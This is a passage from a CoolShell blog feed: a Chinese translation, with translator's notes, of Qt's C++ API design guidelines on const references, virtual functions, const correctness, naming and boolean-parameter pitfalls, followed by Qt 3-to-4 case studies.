<p>// const-ref is much faster than running copy-constructor and destructor<br>
void setAlarm(const QSharedPointer&lt;Alarm&gt; &amp;alarm);</p>
<p>// QDate, QTime, QPoint, QPointF, QSize, QSizeF, QRect<br>
// are good examples of other classes you should pass by value.<br>
[/code]</p>
<blockquote><p>【译注】：这是传引用和传值的差别了，因为传值会有对像拷贝，传引用则不会。所以，如果对像的构造比较重的话（换句话说，就是对像里的成员变量需要的内存比较大），这就会影响很多性能。所以，为了提高性能，最好是传引用。但是如果传入引用的话，会导致这个对象可能会被改变。所以传入const reference。</p></blockquote>
<h2>4.2 虚函数</h2>
<p>在C++中，当类的成员函数声明为virtual，主要是为了通过在子类重载此函数能够定制函数的行为。将函数声明为virtual的目的是为了让对这个函数已有的调用变成执行实际实例的代码路径。对于没有在类外部调用的函数声明成virtual，你应该事先非常慎重地思考过。</p>
<p>[code language=”cpp”]<br>
// QTextEdit in Qt 3: member functions that have no reason for being virtual<br>
virtual void resetFormat();<br>
virtual void setUndoDepth( int d );<br>
virtual void setFormat( QTextFormat *f, int flags );<br>
virtual void ensureCursorVisible();<br>
virtual void placeCursor( const QPoint &amp;pos;, QTextCursor **c = 0 );<br>
virtual void moveCursor( CursorAction action, bool select );<br>
virtual void doKeyboardAction( KeyboardAction action );<br>
virtual void removeSelectedText( int selNum = 0 );<br>
virtual void removeSelection( int selNum = 0 );<br>
virtual void setCurrentFont( const QFont &amp;f );<br>
virtual void setOverwriteMode( bool b ) { overWrite = b; }<br>
[/code]</p>
<p><code>QTextEdit</code>从Qt 3移植到Qt 4的时候，几乎所有的虚函数都被移除了。有趣的是（但在预料之中），并没有人对此有大的抱怨，为什么？因为Qt 3没用到<code>QTextEdit</code>的多态行为 —— 只有你会；简单地说，没有理由去继承<code>QTextEdit</code>并重写这些函数，除非你自己调用了这些方法。如果在Qt在外部你的应用程序你需要多态，你可以自己添加多态。</p>
<blockquote><p>【译注】：『多态』的目的只不过是为了实践 —— 『依赖于接口而不是实现』，也就是说，接口是代码抽像的一个非常重要的方式（在Java/Go中都有专门的接口声明语法）。所以，如果没有接口抽像，使用『多态』的意义也就不大了，因为也就没有必要使用『虚函数』了。</p></blockquote>
<h3>4.2.1 避免虚函数</h3>
<p>在Qt中，我们有很多理由尽量减少虚函数的数量。每一次对虚函数的调用会在函数调用链路中插入一个未掌控的节点（某种程度上使结果更无法预测），使得bug修复变得更复杂。用户在重写的虚函数中可以做很多疯狂的事：</p>
<ul>
<li>发送事件</li>
<li>发送信号</li>
<li>重新进入事件循环（例如，通过打开一个模态文件对话框）</li>
<li>删除对象（即触发『<code>delete this</code>』）</li>
</ul>
<p>还有其他很多原因要避免过度使用虚函数：</p>
<ul>
<li>添加、移动或是删除虚函数都带来二进制兼容问题（binary compatibility/BC）</li>
<li>重载虚函数并不容易</li>
<li>编译器几乎不能优化或内联（inline）对虚函数的调用</li>
<li>虚函数调用需要查找虚函数表（v-table），这比普通函数调用慢了2到3倍</li>
<li>虚函数使得类很难按值拷贝（尽管也可以按值拷贝，但是非常混乱并且不建议这样做）</li>
</ul>
<p>经验告诉我们，没有虚函数的类一般bug更少、维护成本也更低。</p>
<p>一般的经验法则是，除非我们以这个类作为工具集提供而且有很多用户来调用某个类的虚函数，否则这个函数九成不应该设计成虚函数。</p>
<blockquote>
<p>【译注】：</p>
<ol>
<li>使用虚函数时，你需要对编译器的内部行为非常清楚，否则，你会在使用虚函数时，觉得有好些『古怪』的问题发生。比如在创建数组对象的时候。</li>
<li>在C++中，会有一个基础类，这个基础类中已经实现好了很多功能，然后把其中的一些函数放给子类去修改和实现。这种方法在父类和子类都是一组开发人员维护时没有什么问题，但是如果这是两组开发人员，这就会带来很多问题了，就像Qt这样，子类完全无法控制，全世界的开发人员想干什么就干什么。所以，子类的代码和父类的代码在兼容上就会出现很多很多问题。所以，还是上面所说，其实，虚函数应该声明在接口的语义里（这就是设计模式的两个宗旨——依赖于接口，而不是实现；钟爱于组合，而不是继承。也是为什么Java和Go语言使用interface关键字的原因，C++在多态的语义上非常容易滥用）</li>
</ol>
</blockquote>
<h3>4.2.2 虚函数 vs. 拷贝</h3>
<p>多态对象（polymorphic objects）和值类型的类（value-type classes）两者很难协作好。</p>
<p>包含虚函数的类必须把析构函数声明为虚函数，以防止父类析构时没有清理子类的数据，导致内存泄漏。</p>
<p>如果要使一个类能够拷贝、赋值或按值比较，往往需要拷贝构造函数、赋值操作符（<code>operator =</code>）和相等操作符（<code>operator ==</code>）。</p>
<p>[code language=”cpp”]<br>
class CopyClass {<br>
public:<br>
CopyClass();<br>
CopyClass(const CopyClass &amp;other);<br>
~CopyClass();<br>
CopyClass &amp;operator =(const CopyClass &amp;other);<br>
bool operator ==(const CopyClass &amp;other) const;<br>
bool operator !=(const CopyClass &amp;other) const;</p>
<p> virtual void setValue(int v);<br>
};<br>
[/code]</p>
<p>如果继承<code>CopyClass</code>这个类，预料之外的事就已经在代码时酝酿了。一般情况下，如果没有虚成员函数和虚析构函数，就不能创建出可以多态的子类。然而，如果存在虚成员函数和虚析构函数，这突然变成了要有子类去继承的理由，而且开始变得复杂了。<strong><em>起初认为只要简单声明上虚操作符重载函数（virtual operators）。</em></strong> 但其实是走上了一条混乱和毁灭之路（破坏了代码的可读性）。看看下面的这个例子：</p>
<p>[code language=”cpp”]<br>
class OtherClass {<br>
public:<br>
const CopyClass &amp;instance() const; // 这个方法返回的是什么？可以赋值什么？<br>
};<br>
[/code]</p>
<p>（这部份还未完成）</p>
<blockquote><p>【译注】：因为原文上说，这部份并没有完成，所以，我也没有搞懂原文具体也是想表达什么。不过，就标题而言，原文是想说，在多态的情况下拷贝对象所带来的问题？？</p></blockquote>
<h2>4.3 关于const</h2>
<p><strong><em>C++的关键词const表明了内容不会改变或是没有副作用。可以应用于简单的值、指针及指针所指的内容，也可以作为一个特别的属性应用于类的成员函数上，表示成员函数不能修改对象的状态。</em></strong></p>
<p>然而，const本身并没有提供太大的价值 —— 很多编程语言甚至没有类似const的关键词，但是却并没有因此产生问题。实际上，如果你不用函数重载，并在C++源代码用搜索并删除所有的const，几乎总能编译通过并且正常运行。尽量让使用的const保持实用有效，这点很重要。</p>
<p>让我们看一下在Qt的API设计中与const相关的场景。</p>
<h3>4.3.1 输入参数：const指针</h3>
<p>有输入指针参数的const成员函数，几乎总是const指针参数。</p>
<p>如果函数声明为const，意味着既没有副作用，也不会改变对象的可见状态。那为什么它需要一个没有const限定的输入参数呢？记住const类型的函数通常被其他const类型的函数调用，接收到的一般都是const指针（只要不主动const_cast，我们推荐尽量避免使用const_cast）</p>
<p>以前：</p>
<p>[code language=”cpp”]<br>
bool QWidget::isVisibleTo(QWidget *ancestor) const;<br>
bool QWidget::isEnabledTo(QWidget *ancestor) const;<br>
QPoint QWidget::mapFrom(QWidget *ancestor, const QPoint &amp;pos) const;<br>
[/code]</p>
<p><code>QWidget</code>声明了许多非const指针输入参数的const成员函数。注意，这些函数可以修改传入的参数，不能修改对象自己。使用这样的函数常常要借助const_cast转换。如果是const指针输入参数，就可以避免这样的转换了。</p>
<p>之后：</p>
<p>[code language=”cpp”]<br>
bool QWidget::isVisibleTo(const QWidget *ancestor) const;<br>
bool QWidget::isEnabledTo(const QWidget *ancestor) const;<br>
QPoint QWidget::mapFrom(const QWidget *ancestor, const QPoint &amp;pos) const;<br>
[/code]</p>
<p>注意，我们在<code>QGraphicsItem</code>中对此做了修正，但是<code>QWidget</code>要等到Qt 5:</p>
<p>[code language=”cpp”]<br>
bool isVisibleTo(const QGraphicsItem *parent) const;<br>
QPointF mapFromItem (const QGraphicsItem *item, const QPointF &amp;point) const;<br>
[/code]</p>
<h3>4.3.2 返回值：const值</h3>
<p>调用函数返回的非引用类型的结果，称之为右值（R-value）。</p>
<p>非类（non-class）的右值总是无cv限定类型（cv-unqualified type）。虽然从语法上讲，加上const也可以，但是没什么意义，因为鉴于访问权限这些值是不能改变的。多数现代编译器在编译这样的代码时会提示警告信息。</p>
<blockquote><p>【译注】：cv-qualified的类型（与cv-unqualified相反）是由const或者volatile或者volatile const限定的类型。详见<a href="http://en.cppreference.com/w/cpp/language/cv">cv (const and volatile) type qualifiers – C++语言参考</a></p></blockquote>
<p>当在类类型（class type）右值上添加const关键字，则禁止访问非const成员函数以及对成员的直接操作。</p>
<p>不加const则没有以上的限制，但几乎没有必要加上const，因为右值对象生存时间（life time）的结束一般在C++清理的时候（通俗的说，下一个分号地方），而对右值对象的修改随着右值对象的生存时间也一起结束了（也就是本条语句的执行完成的时候）。</p>
<p>示例：</p>
<p>[code language=”cpp”]<br>
struct Foo {<br>
void setValue(int v) { value = v; }<br>
int value;<br>
};</p>
<p>Foo foo() {<br>
return Foo();<br>
}</p>
<p>const Foo cfoo() {<br>
return Foo();<br>
}</p>
<p>int main() {<br>
// The following does compile, foo() is non-const R-value which<br>
// can’t be assigned to (this generally requires an L-value)<br>
// but member access leads to a L-value:<br>
foo().value = 1; // Ok, but temporary will be thrown away at the end of the full-expression.</p>
<p> // The following does compile, foo() is non-const R-value which<br>
// can’t be assigned to, but calling (even non-const) member<br>
// function is fine:<br>
foo().setValue(1); // Ok, but temporary will be thrown away at the end of the full-expression.</p>
<p> // The following does _not_compile, foo() is ”const” R-value<br>
// with const member which member access can’t be assigned to:<br>
cfoo().value = 1; // Not ok.</p>
<p> // The following does _not_compile, foo() is ”const” R-value,<br>
// one cannot call non-const member functions:<br>
cfoo().setValue(1); // Not ok<br>
}<br>
[/code]</p>
<blockquote><p>【译注】：上述的代码说明，如果返回值不是const的，代码可以顺利编译通过，然而并没有什么卵用，因为那个临时对像马上就被抛弃了。所以，这样的无用的代码最好还是在编译时报个错，以免当时头脑发热想错了，写了一段没用但还以为有用的代码。</p></blockquote>
<h3>4.3.3 返回值：非const的指针还是有const的指针</h3>
<p>谈到const函数应该返回非const的指针还是const指针这个话题时，多数人发现在C++中关于『const正确性』（const correctness）在概念上产生了分歧。 <em>问题起源是：<strong>const函数本身不能修改对象自身的状态，却可以返回成员的非const指针</strong>。返回指针这个简单动作本身既不会影响整个对象的可见状态，当然也不会改变这个函数职责范围内涉及的状态。但是，这却使得程序员可以间接访问并修改对象的状态。</em></p>
<p>下面的例子演示了通过返回非const指针的const函数绕开const约定（constness）的诸多方式中的一种：</p>
<p>[code language=”cpp”]<br>
QVariant CustomWidget::inputMethodQuery(Qt::InputMethodQuery query) const {<br>
moveBy(10, 10); // doesn’t compile!<br>
window()-&gt;childAt(mapTo(window(), rect().center()))-&gt;moveBy(10, 10); // compiles!<br>
}<br>
[/code]</p>
<p>返回const指针的函数正是保护以避免这些（可能是不期望的/没有预料到的）副作用，至少是在一定程度上。但哪个函数你会觉得更想返回const指针，或是不止一个函数？</p>
<p>若采用const正确（const-correct）的方法，每个返回某个成员的指针（或多个指向成员的指针）的const函数必须返回const指针。在实践中，很不幸这样的做法将导致无法使用的API：</p>
<p>[code language=”cpp”]<br>
QGraphicsScene scene;<br>
// … populate scene</p>
<p>foreach (const QGraphicsItem *item, scene.items()) {<br>
item-&gt;setPos(qrand() % 500, qrand() % 500); // doesn’t compile! item is a const pointer<br>
}<br>
[/code]</p>
<p><code>QGraphicsScene::items()</code>是一个const函数，顺着思考看起来这个函数只应该返回const指针。</p>
<p>在Qt中，我们几乎只有非const的使用模式。我们选择的是实用路子： 相比滥用非const指针返回类型带来的问题，返回const指针更可能招致过分使用const_cast的问题。</p>
<h3>4.3.4 返回值：按值返回 还是 按const引用返回？</h3>
<p>若返回的是对象的拷贝，那么返回const引用是更直接的方案； 然而，这样的做法限制了后面想要对这个类的重构（refactor）。 （以<code>d-point</code>的典型做法（idiom）为例，我们可以在任何时候改变Qt类在内存表示（memory representation）；但却不能在不破坏二进制兼容性的情况下把改变函数的签名，返回值从<code>const QFoo &amp;</code>变为<code>QFoo</code>。） 基于这个原因，除去对运行速度敏感（speed is critical）而重构不是问题的个别情形（例如，<code>QList::at()</code>），我们一般返回<code>QFoo</code>而不是<code>const QFoo &amp;</code>。</p>
<blockquote><p>【译注】：参看《Effective C++》中条款23：Don’t try to return a reference when you must return an object</p></blockquote>
<h3>4.4.5 const vs. 对象的状态</h3>
<p>const正确性（Const correctness）的问题就像C圈子中vi与emacs的讨论，因为这个话题在很多地方都存在分歧（比如基于指针的函数）。</p>
<p>但通用准则是const函数不能改变类的可见状态。『状态』的意思是『自身以及涉及的职责』。这并不是指非const函数能够改变自身的私有成员，也不是指const函数改变不了。而是指函数是活跃的并存在可见的副作用（visible side effects）。const函数一般没有任何可见的副作用，比如：</p>
<p>[code language=”cpp”]<br>
QSize size = widget-&gt;sizeHint(); // const<br>
widget-&gt;move(10, 10); // not const<br>
[/code]</p>
<p>代理（delegate）负责在其它对象上绘制内容。 它的状态包括它的职责，因此包括在哪个对象做绘制这样的状态。 调用它的绘画行为必然会有副作用； 它改变了它绘制所在设备的外观（及其所关联的状态）。鉴于这些，<code>paint()</code>作为const函数并不合理。 进一步说，任何<code>paint()</code>或<code>QIcon</code>的<code>paint()</code>的视图函数是const函数也不合理。 没有人会从内部的const函数去调用<code>QIcon::paint()</code>，除非他想显式地绕开const这个特性。 如果是这种情况，使用const_cast会更好。</p>
<p>[code language=”cpp”]<br>
// QAbstractItemDelegate::paint is const<br>
void QAbstractItemDelegate::paint(QPainter **painter, const QStyleOptionViewItem &amp;option, const QModelIndex &amp;index) const</p>
<p>// QGraphicsItem::paint is not const<br>
void QGraphicsItem::paint(QPainter *painter, const QStyleOptionGraphicsItem option, QWidget *widget)<br>
[/code]</p>
<p>const关键字并不能按你期望的样子起作用。应该考虑将其移除而不是去重载const/非const函数。</p>
<h1>5. API的语义和文档</h1>
<p>当传值为<code>-1</code>的参数给函数，函数会是什么行为？有很多类似的问题……</p>
<p>是警告、致命错误还是其它？</p>
<p>API需要的是质量保证。API第一个版本一定是不对的；必须对其进行测试。 以阅读使用API的代码的方式编写用例，且验证这样代码是可读的。</p>
<p>还有其他的验证方法，比如</p>
<ul>
<li>让别人使用API（看了文档或是先不看文档都可以）</li>
<li>给类写文档（包含类的概述和每个函数）</li>
</ul>
<h1>6. 命名的艺术</h1>
<p>命名很可能是API设计中最重要的一个问题。类应该叫什么名字？成员函数应该叫什么名字？</p>
<h2>6.1 通用的命名规则</h2>
<p>有几个规则对于所有类型的命名都等同适用。第一个，之前已经提到过，不要使用缩写。即使是明显的缩写，比如把<code>previous</code>缩写成<code>prev</code>，从长远来看是回报是负的，因为用户必须要记住缩写词的含义。</p>
<p>如果API本身没有一致性，之后事情自然就会越来越糟；例如，Qt 3 中同时存在<code>activatePreviousWindow()</code>与<code>fetchPrev()</code>。恪守『不缩写』规则更容易地创建一致性的API。</p>
<p>另一个时重要但更微妙的准则是在设计类时应该保持子类名称空间的干净。在Qt 3中，此项准则并没有一直遵循。以<code>QToolButton</code>为例对此进行说明。如果调用<code>QToolButton</code>的 <code>name()</code>、<code>caption()</code>、<code>text()</code>或者<code>textLabel()</code>，你觉得会返回什么？用Qt设计器在<code>QToolButton</code>上自己先试试吧：</p>
<ul>
<li>
<code>name</code>属性是继承自<code>QObject</code>，返回内部的对象名称，用于调试和测试。</li>
<li>
<code>caption</code>属性继承自<code>QWidget</code>，返回窗口标题，对<code>QToolButton</code>来说毫无意义，因为它在创建的时候parent就存在了。</li>
<li>
<code>text</code>函数继承自<code>QButton</code>，一般用于按钮。当<code>useTextLabel</code>不为<code>true</code>，才用这个属性。</li>
<li>
<code>textLabel</code>属性在<code>QToolButton</code>内声明，当<code>useTextLabel</code>为<code>true</code>时显示在按钮上。</li>
</ul>
<p>为了可读性，在Qt 4中<code>QToolButton</code>的<code>name</code>属性改成了<code>objectName</code>，<code>caption</code>改成了<code>windowTitle</code>，删除了<code>textLabel</code>属性因为和<code>text</code>属性相同。</p>
<p>当你找不到好的命名时，写文档也是个很好方法：要做的就是尝试为各个条目（item）（如类、方法、枚举值等等）写文档，并用写下的第一句话作为启发。如果找不到一个确切的命名，往往说明这个条目是不该有的。如果所有尝试都失败了，并且你坚信这个概念是合理的，那么就发明一个新名字。像widget、event、focus和buddy这些命名就是在这一步诞生的。</p>
<blockquote><p>【译注】：写文档是一个非常好的习惯。写文档的过程其实就是在帮你梳理你的编程思路。很多时候，文档写着写着你就会发现要去改代码去了。除了上述的好处多，写文档还有更多的好处。比如，在写文档的过程中，你发现文字描述过于复杂了，这表明着你的代码或逻辑是复杂的，这就倒逼你去重构你的代码。所以 —— <strong>写文档其实就是写代码</strong>。</p></blockquote>
<h2>6.2 类的命名</h2>
<p>识别出类所在的分组，而不是为每个类都去找个完美的命名。例如，所有Qt 4的能感知模型（model-aware）的item view，类后缀都是<code>View</code>（<code>QListView</code>、<code>QTableView</code>、<code>QTreeView</code>），而相应的基于item（item-based）的类后缀是<code>Widget</code>（<code>QListWidget</code>、<code>QTableWidget</code>、<code>QTreeWidget</code>）。</p>
<h2>6.3 枚举类型及其值的命名</h2>
<p>声明枚举类型时，需要记住在C++中枚举值在使用时不会带上类型（与Java、C#不同）。下面的例子演示了枚举值命名得过于通用的危害：</p>
<p>[code language=”cpp”]<br>
namespace Qt<br>
{<br>
enum Corner { TopLeft, BottomRight, … };<br>
enum CaseSensitivity { Insensitive, Sensitive };<br>
…<br>
};</p>
<p>tabWidget-&gt;setCornerWidget(widget, Qt::TopLeft);<br>
str.indexOf("$(QTDIR)", Qt::Insensitive);<br>
[/code]</p>
<p>在最后一行，<code>Insensitive</code>是什么意思？命名枚举类型的一个准则是在枚举值中至少重复此枚举类型名中的一个元素：</p>
<p>[code language=”cpp”]<br>
namespace Qt<br>
{<br>
enum Corner { TopLeftCorner, BottomRightCorner, … };<br>
enum CaseSensitivity { CaseInsensitive, CaseSensitive };<br>
…<br>
};</p>
<p>tabWidget-&gt;setCornerWidget(widget, Qt::TopLeftCorner);<br>
str.indexOf("$(QTDIR)", Qt::CaseInsensitive);<br>
[/code]</p>
<p>当对枚举值进行或运算并作为某种标志（flag）时，传统的做法是把或运算的结果保存在int型的值中，但这不是类型安全的。Qt 4提供了一个模板类<code>QFlags</code>，其中的<code>T</code>是枚举类型。为了方便使用，Qt用<code>typedef</code>重新定义了<code>QFlag</code>类型，所以可以用<code>Qt::Alignment</code>代替<code>QFlags</code>。</p>
<p>习惯上，枚举类型命名用单数形式（因为它一次只能『持有』一个flag），而持有多个『flag』的类型用复数形式，例如：</p>
<p>[code language=”cpp”]<br>
enum RectangleEdge { LeftEdge, RightEdge, … };<br>
typedef QFlags&lt;RectangleEdge&gt; RectangleEdges;<br>
[/code]</p>
<p>在某些情形下，持有多个『flag』的类型命名用单数形式。对于这种情况，持有的枚举类型名称要求是以<code>Flag</code>为后缀：</p>
<p>[code language=”cpp”]<br>
enum AlignmentFlag { AlignLeft, AlignTop, … };<br>
typedef QFlags&lt;AlignmentFlag&gt; Alignment;<br>
[/code]</p>
<h2>6.4 函数和参数的命名</h2>
<p>函数命名的第一准则是可以从函数名看出来此函数是否有副作用。在Qt 3中，const函数<code>QString::simplifyWhiteSpace()</code>违反了此准则，因为它返回了一个<code>QString</code>而不是按名称暗示的那样，改变调用它的<code>QString</code>对象。在Qt 4中，此函数重命名为<code>QString::simplified()</code>。</p>
<p>虽然参数名不会出现在使用API的代码中，但是它们给程序员提供了重要信息。因为现代的IDE都会在写代码时显示参数名称，所以值得在头文件中给参数起一个恰当的名字并在文档中使用相同的名字。</p>
<h2>6.5 布尔类型的getter与setter方法的命名</h2>
<p>为<code>bool</code>属性的getter和setter方法命名总是很痛苦。getter应该叫做<code>checked()</code>还是<code>isChecked()</code>？<code>scrollBarsEnabled()</code>还是<code>areScrollBarEnabled()</code>？</p>
<p>Qt 4中，我们套用以下准则为getter命名：</p>
<ul>
<li>形容词以<code>is</code>为前缀，例子：
<ul>
<li><code>isChecked()</code></li>
<li><code>isDown()</code></li>
<li><code>isEmpty()</code></li>
<li><code>isMovingEnabled()</code></li>
</ul>
</li>
<li>然而，修饰名词的形容词没有前缀：
<ul>
<li>
<code>scrollBarsEnabled()</code>，而不是<code>areScrollBarsEnabled()</code>
</li>
</ul>
</li>
<li>动词没有前缀，也不使用第三人称(<code>-s</code>)：
<ul>
<li>
<code>acceptDrops()</code>，而不是<code>acceptsDrops()</code>
</li>
<li><code>allColumnsShowFocus()</code></li>
</ul>
</li>
<li>名词一般没有前缀：
<ul>
<li>
<code>autoCompletion()</code>，而不是<code>isAutoCompletion()</code>
</li>
<li><code>boundaryChecking()</code></li>
</ul>
</li>
<li>有的时候，没有前缀容易产生误导，这种情况下会加上<code>is</code>前缀：
<ul>
<li>
<code>isOpenGLAvailable()</code>，而不是<code>openGL()</code>
</li>
<li>
<code>isDialog()</code>，而不是<code>dialog()</code><br>
（一个叫做<code>dialog()</code>的函数，一般会被认为是返回<code>QDialog</code>。）</li>
</ul>
</li>
</ul>
<p>setter的名字由getter衍生，去掉了前缀后在前面加上了<code>set</code>；例如，<code>setDown()</code>与<code>setScrollBarsEnabled()</code>。</p>
<h1>7. 避免常见陷阱</h1>
<h2>7.1 简化的陷阱</h2>
<p>一个常见的误解是：实现需要写的代码越少，API就设计得越好。应该记住：代码只会写上几次，却要被反复阅读并理解。例如：</p>
<p>[code language=”cpp”]<br>
QSlider *slider = new QSlider(12, 18, 3, 13, Qt::Vertical, 0, "volume");<br>
[/code]</p>
<p>这段代码比下面的读起来要难得多（甚至写起来也更难）：</p>
<p>[code language=”cpp”]<br>
QSlider *slider = new QSlider(Qt::Vertical);<br>
slider-&gt;setRange(12, 18);<br>
slider-&gt;setPageStep(3);<br>
slider-&gt;setValue(13);<br>
slider-&gt;setObjectName("volume");<br>
[/code]</p>
<blockquote><p>【译注】：在有IDE的自动提示的支持下，后者写起来非常方便，而前者还需要看相应的文档。</p></blockquote>
<h2>7.2 布尔参数的陷阱</h2>
<p>布尔类型的参数总是带来无法阅读的代码。给现有的函数增加一个<code>bool</code>型的参数几乎永远是一种错误的行为。仍以Qt为例，<code>repaint()</code>有一个<code>bool</code>类型的可选参数用于指定背景是否被擦除。可以写出这样的代码：</p>
<p>[code language=”cpp”]<br>
widget-&gt;repaint(false);<br>
[/code]</p>
<p>初学者很可能是这样理解的，『不要重新绘制！』，能有多少Qt用户真心知道下面3行是什么意思：</p>
<p>[code language=”cpp”]<br>
widget-&gt;repaint();<br>
widget-&gt;repaint(true);<br>
widget-&gt;repaint(false);<br>
[/code]</p>
<p>更好的API设计应该是这样的：</p>
<p>[code language=”cpp”]<br>
widget-&gt;repaint();<br>
widget-&gt;repaintWithoutErasing();<br>
[/code]</p>
<p>在Qt 4中，我们通过移除了重新绘制（repaint）而不擦除widget的能力来解决了此问题。Qt 4的双缓冲使这种特性被废弃。</p>
<p>还有更多的例子：</p>
<p>[code language=”cpp”]<br>
widget-&gt;setSizePolicy(QSizePolicy::Fixed, QSizePolicy::Expanding, true);<br>
textEdit-&gt;insert("Where’s Waldo?", true, true, false);<br>
QRegExp rx("moc_***.c??", false, true);<br>
[/code]</p>
<p>一个明显的解决方案是<code>bool</code>类型改成枚举类型。我们在Qt 4的<code>QString</code>中就是这么做的。对比效果如下：</p>
<p>[code language=”cpp”]<br>
str.replace("%USER%", user, false); // Qt 3<br>
str.replace("%USER%", user, Qt::CaseInsensitive); // Qt 4<br>
[/code]</p>
<blockquote><p>【译注】：关于这个条目可以看看 CoolShell 这篇文章一些展开的讨论： <a href="https://coolshell.cn/articles/5444.html" rel="nofollow">千万不要把 BOOL 设计成函数参数</a>。</p></blockquote>
<h1>8. 案例研究</h1>
<h2>8.1 <code>QProgressBar</code>
</h2>
<p>为了展示上文各种准则的实际应用。我们来研究一下Qt 3中<code>QProgressBar</code>的API，并与Qt 4中对应的API作比较。在Qt 3中：</p>
<p>[code language=”cpp”]<br>
class QProgressBar : public QWidget<br>
{<br>
…<br>
public:<br>
int totalSteps() const;<br>
int progress() const;</p>
<p> const QString &amp;progressString() const;<br>
bool percentageVisible() const;<br>
void setPercentageVisible(bool);</p>
<p> void setCenterIndicator(bool on);<br>
bool centerIndicator() const;</p>
<p> void setIndicatorFollowsStyle(bool);<br>
bool indicatorFollowsStyle() const;</p>
<p>public slots:<br>
void reset();<br>
virtual void setTotalSteps(int totalSteps);<br>
virtual void setProgress(int progress);<br>
void setProgress(int progress, int totalSteps);</p>
<p>protected:<br>
virtual bool setIndicator(QString &amp;progressStr,<br>
int progress,<br>
int totalSteps);<br>
…<br>
};<br>
[/code]</p>
<p>该API相当的复杂和不一致；例如，<code>reset()</code>、<code>setTotalSteps()</code>、<code>setProgress()</code>是紧密联系的，但方法的命名并没明确地表达出来。</p>
<p>改善此API的关键是抓住<code>QProgressBar</code>与Qt 4的<code>QAbstractSpinBox</code>及其子类<code>QSpinBox</code>、<code>QSlider</code>、<code>QDail</code>之间的相似性。怎么做？把<code>progress</code>、<code>totalSteps</code>替换为<code>minimum</code>、<code>maximum</code>和<code>value</code>。增加一个<code>valueChanged()</code>消息，再增加一个<code>setRange()</code>函数。</p>
<p>进一步可以观察到<code>progressString</code>、<code>percentage</code>与<code>indicator</code>其实是一回事，即是显示在进度条上的文本。通常这个文本是个百分比，但是可通过<code>setIndicator()</code>设置为任何内容。以下是新的API：</p>
<p>[code language=”cpp”]<br>
virtual QString text() const;<br>
void setTextVisible(bool visible);<br>
bool isTextVisible() const;<br>
[/code]</p>
<p>默认情况下，显示文本是百分比指示器（percentage indicator），通过重写<code>text()</code>方法来定制行为。</p>
<p>Qt 3的<code>setCenterIndicator()</code>与<code>setIndicatorFollowsStyle()</code>是两个影响对齐方式的函数。他们可被一个<code>setAlignment()</code>函数代替：</p>
<p>[code language=”cpp”]<br>
void setAlignment(Qt::Alignment alignment);<br>
[/code]</p>
<p>如果开发者未调用<code>setAlignment()</code>，那么对齐方式由风格决定。对于基于<code>Motif</code>的风格，文字内容在中间显示；对于其他风格，在右侧显示。</p>
<p>下面是改善后的<code>QProgressBar API</code>:</p>
<p>[code language=”cpp”]<br>
class QProgressBar : public QWidget<br>
{<br>
…<br>
public:<br>
void setMinimum(int minimum);<br>
int minimum() const;<br>
void setMaximum(int maximum);<br>
int maximum() const;<br>
void setRange(int minimum, int maximum);<br>
int value() const;</p>
<p> virtual QString text() const;<br>
void setTextVisible(bool visible);<br>
bool isTextVisible() const;<br>
Qt::Alignment alignment() const;<br>
void setAlignment(Qt::Alignment alignment);</p>
<p>public slots:<br>
void reset();<br>
void setValue(int value);</p>
<p>signals:<br>
void valueChanged(int value);<br>
…<br>
};<br>
[/code]</p>
<h2>8.2 <code>QAbstractPrintDialog</code> &amp; <code>QAbstractPageSizeDialog</code>
</h2>
<p>Qt 4.0有2个幽灵类<code>QAbstractPrintDialog</code>和<code>QAbstractPageSizeDialog</code>，作为 <code>QPrintDialog</code>和<code>QPageSizeDialog</code>类的父类。这2个类完全没有用，因为Qt的API没有是<code>QAbstractPrint-</code>或是<code>-PageSizeDialog</code>指针作为参数并执行操作。通过篡改qdoc（Qt文档），我们虽然把这2个类隐藏起来了，却成了无用抽象类的典型案例。</p>
<p>这不是说，<strong><em>好</em></strong> 的抽象是错的，<code>QPrintDialog</code>应该是需要有个工厂或是其它改变的机制 —— 证据就是它声明中的<code>#ifdef QTOPIA_PRINTDIALOG</code>。</p>
<h2>8.3 <code>QAbstractItemModel</code>
</h2>
<p>关于模型/视图（model/view）问题的细节在相应的文档中已经说明得很好了，但作为一个重要的总结这里还需要强调一下：抽象类不应该仅是所有可能子类的并集（union）。这样『合并所有』的父类几乎不可能是一个好的方案。<code>QAbstractItemModel</code>就犯了这个错误 —— 它实际上就是个<code>QTreeOfTablesModel</code>，结果导致了错综复杂（complicated）的API，而这样的API要让 <strong><em>所有本来设计还不错的子类</em></strong> 去继承。</p>
<p>仅仅增加抽象是不会自动就把API变得更好的。</p>
<h2>8.4 <code>QLayoutIterator</code> &amp; <code>QGLayoutIterator</code>
</h2>
<p>在Qt 3，创建自定义的布局类需要同时继承<code>QLayout</code>和<code>QGLayoutIterator</code>（命名中的<code>G</code>是指Generic（通用））。<code>QGLayoutIterator</code>子类的实例指针会包装成<code>QLayoutIterator</code>，这样用户可以像和其它的迭代器（iterator）类一样的方式来使用。通过<code>QLayoutIterator</code>可以写出下面这样的代码：</p>
<p>[code language=”cpp”]<br>
QLayoutIterator it = layout()-&gt;iterator();<br>
QLayoutItem **child;<br>
while ((child = it.current()) != 0) {<br>
if (child-&gt;widget() == myWidget) {<br>
it.takeCurrent();<br>
return;<br>
}<br>
++it;<br>
}<br>
[/code]</p>
<p>在Qt 4，我们干掉了<code>QGLayoutIterator</code>类（以及用于盒子布局和格子布局的内部子类），转而是让<code>QLayout</code>的子类重写<code>itemAt()</code>、<code>takeAt()</code>和<code>count()</code>。</p>
<h2>8.5 <code>QImageSink</code>
</h2>
<p>Qt 3有一整套类用来把完成增量加载的图片传递给一个动画 —— <code>QImageSource</code>/<code>Sink</code>/<code>QASyncIO</code>/<code>QASyncImageIO</code>。由于这些类之前只是用于启用动画的<code>QLabel</code>，完全过度设计了（overkill）。</p>
<p>从中得到的教训就是：对于那些未来可能的还不明朗的需求，不要过早地增加抽象设计。当需求真的出现时，比起一个复杂的系统，在简单的系统新增需求要容易得多。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-07-25T14:16:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/18024.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何免费的让网站启用HTTPS ]]></title>
<link>https://coolshell.cn/articles/18094.html</link>
<content><![CDATA[ 
